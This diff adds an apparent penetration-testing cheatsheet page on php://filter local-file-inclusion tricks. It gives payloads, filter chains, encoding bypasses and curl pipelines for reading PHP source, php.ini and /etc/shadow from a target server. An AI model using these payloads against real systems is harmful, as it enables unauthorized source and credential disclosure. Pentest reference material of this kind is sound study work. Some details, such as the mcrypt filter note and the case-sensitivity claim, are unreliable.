@@ -1,0 +1,222 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PHP filters · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › File Inclusion</nav><h1>PHP filters</h1><p class="cx-lede">Using php://filter to read PHP source code that would otherwise be executed - base64 encoding the file contents before they reach the renderer.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1083</span><span class="cx-tag">D3FEND D3-FA</span><span class="cx-tag">IMPACT FileRead</span><span class="cx-tag">OWASP A05</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>When the LFI sink executes PHP files (rather than reading them), including <code>config.php</code> runs it - you get the rendered output, not the source. The <code>php://filter</code> wrapper transforms the file contents before they reach the renderer, letting you base64-encode the source and read it.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Read source of config.php - base64-encoded, won&#x27;t execute as PHP
+?page=php://filter/convert.base64-encode/resource=config
+
+# Decode the response
+echo &#x27;PD9waHAK...&#x27; | base64 -d
+
+# Other useful filters
+?page=php://filter/convert.iconv.utf-8.utf-16/resource=config             # corrupts the PHP so it can&#x27;t execute
+?page=php://filter/string.rot13/resource=config                          # ROT13 the source
+?page=php://filter/zlib.deflate/convert.base64-encode/resource=config    # compress + b64 for big files</code></pre></figure>
+<p>Success indicator: a base64 string in the response that decodes to PHP source code.</p>
+<h2 id="why-this-is-needed">Why this is needed</h2>
+<p>The vulnerable function determines what happens when you include a file:</p>
+<table>
+<thead>
+<tr>
+<th>Function</th>
+<th>Behavior on <code>?page=config.php</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>include()</code>, <code>require()</code></td>
+<td>Executes the PHP - you see rendered HTML, not source</td>
+</tr>
+<tr>
+<td><code>file_get_contents()</code></td>
+<td>Returns raw bytes - source visible directly</td>
+</tr>
+<tr>
+<td><code>readfile()</code></td>
+<td>Returns raw bytes - source visible directly</td>
+</tr>
+<tr>
+<td><code>fopen()</code> + read</td>
+<td>Returns raw bytes - source visible directly</td>
+</tr>
+</tbody>
+</table>
+<p>When the function executes, asking for <code>config.php</code> runs the file. If the config file just sets variables and doesn't echo anything, the response is empty. If it echoes a welcome message, you see that - but never the source code itself.</p>
+<p>The PHP filter wrapper interposes a transformation on the bytes between the file read and the executor. By base64-encoding the bytes, the result is no longer valid PHP - the executor sees a string like <code>PD9waHAK...</code> (just text), so it can't execute, but the bytes are reflected to the response.</p>
+<h2 id="the-base64-filter">The base64 filter</h2>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=php://filter/convert.base64-encode/resource=config</code></pre></figure>
+<p>Three parts:</p>
+<ul>
+<li><code>php://filter/</code> - invoke the filter wrapper</li>
+<li><code>convert.base64-encode/</code> - the transformation to apply</li>
+<li><code>resource=config</code> - the file to read (no extension; the app appends <code>.php</code>)</li>
+</ul>
+<p>Submit, capture the response, locate the base64 chunk (often surrounded by the page's normal HTML), decode:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">curl -s &quot;https://target.example.com/?page=php://filter/convert.base64-encode/resource=config&quot; \
+    | grep -oE &#x27;[A-Za-z0-9+/=]{40,}&#x27; \
+    | base64 -d</code></pre></figure>
+<p>The <code>grep</code> extracts the base64 chunk (40+ chars of base64 alphabet). Adjust based on where the response renders the encoded bytes.</p>
+<h3 id="when-the-app-appends-php">When the app appends <code>.php</code></h3>
+<p>The append happens after your input is parsed. So <code>php://filter/.../resource=config</code> becomes <code>php://filter/.../resource=config.php</code> - which is exactly what you want. The appended extension actually helps in this case.</p>
+<h3 id="when-the-app-has-a-path-prefix">When the app has a path prefix</h3>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">include(&quot;./pages/&quot; . $_GET[&#x27;page&#x27;]);</code></pre></figure>
+<p>Becomes <code>./pages/php://filter/.../resource=config</code> - invalid because of the prefix. Use <code>../</code> to escape the prefix first:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=../../php://filter/convert.base64-encode/resource=config</code></pre></figure>
+<p>PHP resolves the path: the <code>../../</code> walks out of <code>./pages/</code>, then <code>php://filter/...</code> is interpreted as a wrapper URL. Specific path depth varies.</p>
+<p>This doesn't always work - some PHP setups normalize the path before checking for wrapper schemes. When the prefix is <code>./pages/</code> and the wrapper string is "inside" the prefix, the resolver might reject it. Test and adjust.</p>
+<h2 id="reading-non-php-files">Reading non-PHP files</h2>
+<p><code>php://filter</code> works on any file, not just PHP. For non-executable files (config, logs), the wrapper is just an obfuscation - you could read them directly. But the filter form is sometimes useful:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Read .ini files (would render as HTML if returned directly)
+?page=php://filter/convert.base64-encode/resource=/etc/php/7.4/apache2/php.ini
+
+# Read binary files without corruption
+?page=php://filter/convert.base64-encode/resource=/var/www/html/logo.png
+
+# Read files containing characters that break the HTML response
+?page=php://filter/convert.base64-encode/resource=/etc/shadow</code></pre></figure>
+<p>Base64 makes binary content survive the HTML rendering layer without escaping or stripping. Useful when the application's renderer mangles raw bytes.</p>
+<h2 id="reading-the-php-config">Reading the PHP config</h2>
+<p>A particularly valuable target - the PHP configuration file. Reveals what wrappers are enabled, security policies, extension availability:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=php://filter/convert.base64-encode/resource=/etc/php/7.4/apache2/php.ini</code></pre></figure>
+<p>Try common paths:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>/etc/php/7.4/apache2/php.ini                 # Apache + PHP 7.4 on Debian/Ubuntu
+/etc/php/8.1/apache2/php.ini
+/etc/php/7.4/fpm/php.ini                     # FPM (Nginx + PHP-FPM)
+/etc/php/8.1/fpm/php.ini
+/etc/php.ini                                 # CentOS/RHEL
+/usr/local/etc/php/php.ini                   # FreeBSD, some Docker images
+/opt/lampp/etc/php.ini                       # XAMPP
+C:\xampp\php\php.ini                         # XAMPP on Windows</code></pre></figure>
+<p>Once you have the config, grep for the values that matter:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">echo &quot;$BASE64&quot; | base64 -d | grep -E &#x27;^(allow_url_include|allow_url_fopen|open_basedir|disable_functions|extension)&#x27;</code></pre></figure>
+<p>Key settings:</p>
+<table>
+<thead>
+<tr>
+<th>Setting</th>
+<th>What enabling means</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>allow_url_include = On</code></td>
+<td>RFI and <code>data://</code>, <code>php://input</code> wrappers work</td>
+</tr>
+<tr>
+<td><code>allow_url_fopen = On</code></td>
+<td>Functions like <code>file_get_contents</code> accept remote URLs</td>
+</tr>
+<tr>
+<td><code>open_basedir = /var/www</code></td>
+<td>LFI restricted to that directory tree (escape paths)</td>
+</tr>
+<tr>
+<td><code>disable_functions = ...</code></td>
+<td>Specific functions blocked - affects post-RCE escape paths</td>
+</tr>
+<tr>
+<td><code>extension=expect</code></td>
+<td><code>expect://</code> wrapper is loaded → expect attack works</td>
+</tr>
+<tr>
+<td><code>extension=zip</code></td>
+<td><code>zip://</code> wrapper enabled → can use <a href="../file-upload-chain/index.html">file-upload zip chain</a></td>
+</tr>
+</tbody>
+</table>
+<p>This single file tells you most of what's possible with the LFI before you start trying attacks. Read it first when you have working <code>php://filter</code> access.</p>
+<h2 id="finding-php-files-to-read">Finding PHP files to read</h2>
+<p>You need to know the filename to read its source. Two approaches:</p>
+<h3 id="fuzzing">Fuzzing</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
+     -u &quot;https://target.example.com/FUZZ.php&quot; \
+     -mc 200,302,403</code></pre></figure>
+<p>Hit on any of these = a file exists and is being served. The 302 and 403 cases are still useful - you can read the file via LFI even if direct access is blocked.</p>
+<h3 id="following-references">Following references</h3>
+<p>Start with <code>index.php</code>, read its source, look for <code>include(...)</code>, <code>require(...)</code>, <code>class ... extends</code>, and similar references. Read those next. Recurse.</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Get the source of index.php
+TOKEN=$(curl -s &quot;https://target.example.com/?page=php://filter/convert.base64-encode/resource=index&quot; | grep -oE &#x27;[A-Za-z0-9+/=]{40,}&#x27;)
+echo &quot;$TOKEN&quot; | base64 -d &gt; /tmp/index.php.src
+
+# Find references
+grep -E &quot;(include|require)[^a-z]&quot; /tmp/index.php.src
+grep -E &quot;[&#x27;\&quot;][a-zA-Z_/-]+\.php[&#x27;\&quot;]&quot; /tmp/index.php.src</code></pre></figure>
+<p>After reading several files, the application's structure becomes clear. Look for:</p>
+<ul>
+<li>Database connection setup → <code>config.php</code>, <code>db.php</code>, <code>connection.php</code></li>
+<li>Authentication logic → <code>auth.php</code>, <code>login.php</code>, <code>session.php</code></li>
+<li>Admin functionality → <code>admin/index.php</code>, <code>admin/users.php</code></li>
+<li>API endpoints → <code>api/v1/*.php</code>, <code>endpoints.php</code></li>
+</ul>
+<h2 id="other-filter-types">Other filter types</h2>
+<p>The base64 filter is the workhorse. A few others are occasionally useful:</p>
+<h3 id="string-filters">String filters</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=php://filter/string.rot13/resource=config
+?page=php://filter/string.strip_tags/resource=config
+?page=php://filter/string.toupper/resource=config</code></pre></figure>
+<p><code>string.rot13</code> is sometimes used to bypass filters that look for PHP tags (<code>&lt;?php</code>) in the input.</p>
+<h3 id="conversion-filters">Conversion filters</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=php://filter/convert.iconv.utf-8.utf-16/resource=config
+?page=php://filter/convert.iconv.utf-8.utf-7/resource=config
+?page=php://filter/convert.quoted-printable-encode/resource=config</code></pre></figure>
+<p><code>iconv.utf-8.utf-16</code> converts the source to UTF-16, which makes the PHP code unparseable - same effect as base64 (prevents execution), readable in the response. UTF-7 has its own use case for XSS via inclusion but rare in LFI.</p>
+<h3 id="compression-filters">Compression filters</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=php://filter/zlib.deflate/convert.base64-encode/resource=large_file</code></pre></figure>
+<p>Chains compress + base64 in one shot. Useful when files are large enough that the base64 response gets truncated by the application or proxy.</p>
+<h3 id="encryption-filters-php-70">Encryption filters (PHP ≥7.0)</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=php://filter/mcrypt.rijndael-128.encode.SECRET/resource=config</code></pre></figure>
+<p>Encrypts the content with a specified key. Mostly used by attackers trying to obfuscate exfiltrated content from monitoring - not commonly useful for the operator who just wants to read source.</p>
+<h2 id="chaining-filters">Chaining filters</h2>
+<p>The pipe character chains filters left to right:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=php://filter/zlib.deflate|convert.base64-encode/resource=...</code></pre></figure>
+<p>Equivalent to applying <code>zlib.deflate</code> first, then <code>base64-encode</code>. Decode in reverse:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">echo &quot;$TOKEN&quot; | base64 -d | zlib-flate -uncompress    # need zlib-flate or python zlib</code></pre></figure>
+<p>Python helper:</p>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python">import base64, zlib
+with open(&#x27;encoded.txt&#x27;) as f:
+    data = base64.b64decode(f.read())
+print(zlib.decompress(data, -15).decode())</code></pre></figure>
+<h2 id="when-phpfilter-is-blocked">When <code>php://filter</code> is blocked</h2>
+<p>Some applications filter the <code>php://</code> scheme outright. A few workarounds:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Case manipulation (sometimes bypasses case-sensitive filters)
+?page=PHP://filter/convert.base64-encode/resource=config
+
+# URL encoding the colon
+?page=php%3a//filter/convert.base64-encode/resource=config
+
+# Double-encoding
+?page=php%253a%252f%252ffilter%252fconvert.base64-encode%252fresource=config</code></pre></figure>
+<p>If the scheme is genuinely blocked, source disclosure via this path is closed. Move to <a href="../file-upload-chain/index.html">file-upload chain</a> or <a href="../log-poisoning/index.html">log poisoning</a> if RCE is the goal - those don't need source disclosure.</p>
+<h2 id="detection-only-checks">Detection-only checks</h2>
+<p>Probes that confirm <code>php://filter</code> is reachable without reading anything sensitive:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Read index.php source (you can see it rendered anyway)
+curl -s &quot;https://target.example.com/?page=php://filter/convert.base64-encode/resource=index&quot; \
+    | grep -oE &#x27;[A-Za-z0-9+/=]{40,}&#x27; \
+    | head -c 60
+
+# A response containing a long base64 chunk = filter works
+# No base64 chunk = filter blocked or path/extension wrong</code></pre></figure>
+<h2 id="php-74-behavior-changes">PHP 7.4+ behavior changes</h2>
+<p>A few quirks to know about modern PHP:</p>
+<ul>
+<li><strong><code>php://filter</code> requires <code>allow_url_include</code>?</strong> No - <code>php://filter</code> is exempt from this restriction even on hardened servers. It's the most reliable LFI wrapper because of this.</li>
+<li><strong><code>allow_url_fopen = Off</code> doesn't block <code>php://filter</code>.</strong> Same reason - local file access through wrappers is treated separately.</li>
+<li><strong><code>open_basedir</code> does restrict <code>php://filter</code>.</strong> When <code>open_basedir = /var/www</code>, you can't <code>resource=/etc/passwd</code>. The wrapper checks against the basedir like any other file access.</li>
+</ul>
+<p>The bypass when <code>open_basedir</code> is set: read whatever's inside the basedir (app source, often valuable on its own) and look for credentials, then pivot.</p>
+<h2 id="notes">Notes</h2>
+<ul>
+<li><strong><code>php://filter</code> is the highest-yield LFI primitive on PHP apps.</strong> It survives most filter configurations, doesn't require <code>allow_url_include</code>, and works on the file types the operator cares about. Always try it before assuming source disclosure is closed.</li>
+<li><strong>The base64 chunk is sometimes split across the response.</strong> When the response includes the encoded data inside <code>&lt;pre&gt;</code> tags or a <code>&lt;textarea&gt;</code>, the chunk is contiguous. When it's interpolated into multiple places, you may have to concatenate fragments by hand.</li>
+<li><strong>Source code is information disclosure with compound value.</strong> Reading source reveals other bugs (SQLi sinks, command injection, hardcoded credentials, hidden endpoints) that you can then exploit through different channels. Source disclosure via LFI often leads to RCE via SQLi found in the source, not through the LFI itself.</li>
+<li><strong>The wrapper string is case-sensitive but the filter names sometimes aren't.</strong> <code>php://filter/...</code> (lowercase) is required; the filter name (<code>convert.base64-encode</code>) sometimes accepts variants like <code>CONVERT.BASE64-ENCODE</code> depending on the PHP version. Try if the lowercase version fails.</li>
+</ul>
+<div class="cx-aside cx-tip">
+<p class="cx-aside-title">Tip</p>
+<p>The single most valuable file to read via <code>php://filter</code> is the PHP configuration (<code>php.ini</code>). It tells you which wrappers work, what's restricted, and where logs are written - answering a dozen questions about the target in one read.</p>
+</div></article><nav class="cx-pager"><a class="cx-prev" href="../filter-bypasses/index.html">Previous: Filter bypasses</a><a class="cx-next" href="../wrappers/index.html">Next: Wrappers</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
